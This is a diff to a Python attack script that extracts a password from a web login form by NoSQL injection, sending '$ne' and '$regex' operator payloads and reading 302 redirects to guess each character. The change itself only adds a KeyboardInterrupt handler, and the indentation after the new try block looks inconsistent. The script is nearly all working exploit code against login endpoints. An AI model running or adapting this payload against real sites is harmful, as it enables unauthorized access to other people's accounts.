@@ -9,7 +9,8 @@ password=''
 u='http://example.com'
 headers={'content-type': 'application/x-www-form-urlencoded'}
 
-while True:
+try:
+  while True:
 	for c in string.printable:
 		if c not in ['*','+','.','?','|', '#', '&', '$']:
 			payload='username[$ne]=%s&password[$regex]=^%s' % (username, password + c)
@@ -21,5 +22,7 @@ while True:
 			if r.status_code == 302:
 				print("pass : %s" % (password+c))
 				password += c
-
+except KeyboardInterrupt:
+        print("\nShutdown...")
+        sys.exit()                 
 			
